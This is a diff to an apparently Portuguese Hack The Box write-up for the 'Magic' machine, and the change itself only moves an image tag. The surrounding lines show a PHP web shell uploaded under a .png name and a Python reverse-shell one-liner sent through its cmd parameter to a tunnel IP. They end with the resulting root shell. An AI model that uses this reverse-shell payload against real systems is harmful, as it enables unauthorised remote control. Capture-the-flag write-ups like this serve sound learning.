@@ -277,6 +277,7 @@ Note that quotes are necessary around arguments which contain certain special ch
 </code></pre></div><p>vamos utilizar este ^</p>
 <p>fiz o teste para ver se o upload da imagem deu certo &gt;</p>
 <p>http://10.10.10.185/images/uploads/fxshell.php.png</p>
+<p><img src="/print3-magic.png" alt="HTB"></p>
 <div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.185</span><span class="o">/</span><span class="n">images</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">fxshell</span><span class="o">.</span><span class="n">php</span><span class="o">.</span><span class="n">png</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.15&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
 </code></pre></div><p>o codigo ficará assim, mudando apenas meu IP de tunelamento no script em python</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">connect to <span class="o">[</span>10.10.14.247<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.185<span class="o">]</span> <span class="m">52180</span>
@@ -431,8 +432,7 @@ python3 -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(soc
 root@ubuntu:/tmp/root# whoami
 whoami
 root
-</code></pre></div><p><img src="/print3-magic.png" alt="HTB"></p>
-
+</code></pre></div>
 </main>
     <footer>
   
